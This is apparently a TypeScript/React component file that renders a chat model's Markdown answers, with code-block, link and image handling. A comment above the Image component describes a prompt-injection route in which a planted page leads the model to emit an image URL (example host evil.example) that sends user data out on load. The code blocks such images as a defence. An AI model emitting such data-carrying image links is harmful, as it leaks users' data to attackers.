import { memo, useEffect, useState, type ComponentProps } from 'react'
import ReactMarkdown, { type Components, type ExtraProps } from 'react-markdown'
import { toText } from 'hast-util-to-text'
import rehypeHighlight from 'rehype-highlight'
import remarkGfm from 'remark-gfm'
import remarkMath from 'remark-math'
import { dollarMath } from './math.ts'
import { WrapText } from 'lucide-react'
import { CopyButton, IconAction } from './MessageActions.tsx'

const remarkPlugins = [remarkGfm, remarkMath]
type Katex = typeof import('./katex.ts').rehypeKatex

// Math is written with $…$, $$…$$, \(…\) or \[…\].
const HAS_MATH = /\$|\\[([]/

// Kept once loaded, so later messages with math don't show it untypeset.
let katex: Katex | null = null

/** The math plugin, loaded the first time a message needs it. */
function useKatex(text: string): Katex | null {
  // A function, so React is given it to keep and not to call.
  const [loaded, setLoaded] = useState<Katex | null>(() => katex)
  const needed = HAS_MATH.test(text)
  useEffect(() => {
    if (!needed || loaded) return
    void import('./katex.ts').then((m) => {
      katex = m.rehypeKatex
      setLoaded(() => m.rehypeKatex)
    })
  }, [needed, loaded])
  return loaded
}
const components: Components = { pre: CodeBlock, a: Link, img: Image }

/**
 * Renders model output (see `Markdown`, which loads this). Raw HTML in the text is not rendered. Memoized: a
 * streamed answer re-renders the whole chat for every chunk, and parsing,
 * highlighting and typesetting every earlier answer again made long chats
 * stall; only a changed `text` renders again.
 */
export const MarkdownView = memo(function MarkdownView({
  text,
}: {
  text: string
}) {
  const math = useKatex(text)
  return (
    <div className="markdown">
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={math ? [math, rehypeHighlight] : [rehypeHighlight]}
        components={components}
      >
        {dollarMath(text)}
      </ReactMarkdown>
    </div>
  )
})

/** Blocks this long get line numbers (short ones read better without). */
const NUMBERED_FROM = 12

/** A fenced code block, labelled with its language when one is given. */
function CodeBlock({ node, ...props }: ComponentProps<'pre'> & ExtraProps) {
  const code = node?.children[0]
  const classes = code?.type === 'element' ? code.properties.className : null
  const language = Array.isArray(classes)
    ? classes
        .map(String)
        .find((c) => c.startsWith('language-'))
        ?.slice('language-'.length)
    : undefined
  const [wrap, setWrap] = useState(false)
  const lineCount = node
    ? toText(node).replace(/\n$/, '').split('\n').length
    : 0
  // Numbers line up with the code only while lines aren't wrapped.
  const numbered = lineCount >= NUMBERED_FROM && !wrap
  return (
    <div className="code-block">
      <div className="code-header">
        <span className="code-label">{language}</span>
        <span className="code-actions">
          <IconAction
            label="Wrap lines"
            pressed={wrap}
            onClick={() => setWrap((on) => !on)}
          >
            <WrapText />
          </IconAction>
          {node && <CopyButton text={toText(node)} label="Copy code" />}
        </span>
      </div>
      <div className="code-body" data-wrap={wrap || undefined}>
        {numbered && (
          <span className="code-lines" aria-hidden>
            {Array.from({ length: lineCount }, (_, i) => i + 1).join('\n')}
          </span>
        )}
        <pre {...props} />
      </div>
    </div>
  )
}

/**
 * Shows only images chibot serves. An answer written under the influence of a
 * planted page can hold an image whose address carries the user's data
 * (`![](https://evil.example/c?d=…)`); a browser that loads it has sent the
 * data without a click. Any other image is a link to open on purpose.
 */
function Image({
  node: _node,
  src,
  alt,
  ...props
}: ComponentProps<'img'> & ExtraProps) {
  if (!src) return null
  const own = URL.parse(src, location.origin)?.origin === location.origin
  if (own) return <img src={src} alt={alt} {...props} />
  return (
    <a
      href={src}
      target="_blank"
      rel="noopener noreferrer"
      title="Not loaded automatically: open it to see the image"
    >
      {alt || 'Image'}
    </a>
  )
}

/** Opens links in a new tab, so following one doesn't leave (and stop) the chat. */
function Link({
  node: _node,
  href,
  ...props
}: ComponentProps<'a'> & ExtraProps) {
  // Footnote references (#…) stay on the page.
  if (href?.startsWith('#')) return <a href={href} {...props} />
  return <a href={href} target="_blank" rel="noopener noreferrer" {...props} />
}
